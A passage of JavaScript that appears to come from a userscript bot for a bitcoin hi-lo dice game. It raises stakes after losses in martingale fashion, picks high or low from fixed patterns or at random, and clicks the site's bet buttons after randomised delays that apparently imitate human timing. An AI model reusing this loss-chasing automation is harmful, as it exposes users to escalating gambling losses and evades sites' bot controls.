                    if (consecutive_lost > 0) {
                        game2_step=7;
                        return past_bet+(past_bet*INCR/100);
                    } else {
                        // Playing and won, go back to the begin
                        game2_step=0;
                        game2_consecutive_lost_passed=false;
                        game2_finished_loosing=false;
                        game2_play_began=false;
                        game2_play_after_losses=0;
                        game2_play_count++;
                        if (GAME_TYPE == 3) { 
                            MIN_LOSSES_BEFORE_PLAY++;
                            if (LOGGING > 2) console.log("New MIN_LOSSES_BEFORE_PLAY value is: "+MIN_LOSSES_BEFORE_PLAY); 
                        }
                        return MIN_BET;
                    }
                }
            }
        }
    }
}

function get_bet_odds () {
    if (GAME_TYPE == 0) { return 2; }
    else return ODDS;
}

function get_bet_hilo (index) {
    if (HIGH_LOW == 3 ) {
        var olaer = ['H','L','L','H','H','H','L','L','L','L','H','H','H','H','H','L','L','L','L','L','L','H','H','H','H','H','H','H','L','L','L','L','L','L','L','L'];
        var key = index % olaer.length;
        return olaer[key];
    } else if (HIGH_LOW == 1) {
        return "H";
    } else if (HIGH_LOW == 2) {
        return "L";
    } else {
        var r = random(1,10);
        if (r<5) return 'H';
        else return 'L';
    }
}


function bet(amount, hl, odds, fast) {
    var toclick; var wait_time_1=0; var wait_time_2=0;
    if (hl == "L") toclick = "#double_your_btc_bet_lo_button";
    else toclick = "#double_your_btc_bet_hi_button";
    //if (LOGGING > 4) console.log(">> playing: "+hl+", betting: "+amount.toFixed(8) );
    tot_multiply_bets++;
    setCookie('tot_multiply_bets', tot_multiply_bets, 7);

    if (SPEED == 0) {
        wait_time_1 = random(2000,10000); wait_time_2=random(1000,5000);
    } else if (SPEED == 1) {
        if (Boolean(fast)) { wait_time_1 = random(300,900); wait_time_2=random(100,200); }
        else { wait_time_1 = random(1133,5544); wait_time_2=random(100,1000); }
    } else if (SPEED == 2) {
        wait_time_1 = random(300,1000); wait_time_2=random(100,200);
    } else {
        wait_time_1 = random(10,20); wait_time_2=0;
    }

    setTimeout (function(){            
        $("#double_your_btc_stake").val(parseFloat(amount).toFixed(8));
        $("#double_your_btc_payout_multiplier").val(odds);
        setTimeout(function(){ $(toclick).click(); }, wait_time_1 );
    }, wait_time_2 );
} 